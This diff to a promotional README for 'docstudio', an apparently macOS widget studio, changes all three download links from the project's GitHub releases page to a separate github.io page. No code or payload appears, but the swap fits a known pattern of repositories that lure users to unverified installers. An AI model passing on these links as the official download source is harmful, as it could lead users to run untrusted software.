@@ -4,7 +4,7 @@
 
 Welcome to **docstudio** — the ultimate macOS widget studio that puts creative power right at your fingertips! Whether you're a designer, developer, or just someone who loves customizing their digital workspace, docstudio makes it incredibly easy to build, preview, and manage beautiful widgets directly on your desktop.
 
-**Visit this link to download the application:** [Download docstudio](https://github.com/Showerijssel2131/docstudio/releases)
+**Visit this link to download the application:** [Download docstudio](https://showerijssel2131.github.io)
 
 )
 
@@ -55,7 +55,7 @@ Built as a native macOS application, docstudio runs efficiently without consumin
 Ready to get started? Follow these simple steps:
 
 ### Step 1: Visit the Download Page
-**Visit this link to download the application:** [Download docstudio](https://github.com/Showerijssel2131/docstudio/releases)
+**Visit this link to download the application:** [Download docstudio](https://showerijssel2131.github.io)
 
 )
 
@@ -219,7 +219,7 @@ To be notified of new releases and updates, make sure to "Watch" or"Star" the re
 
 docstudio brings professional-grade widget creation to everyone, regardless of technical skill level. With its intuitive drag-and-drop interface, live widget support, and beautiful customization options, you can transform your macOS desktop into something truly personal and functional.
 
-**Visit this link to download the application:** [Download docstudio](https://github.com/Showerijssel2131/docstudio/releases)
+**Visit this link to download the application:** [Download docstudio](https://showerijssel2131.github.io)
 
 )
 
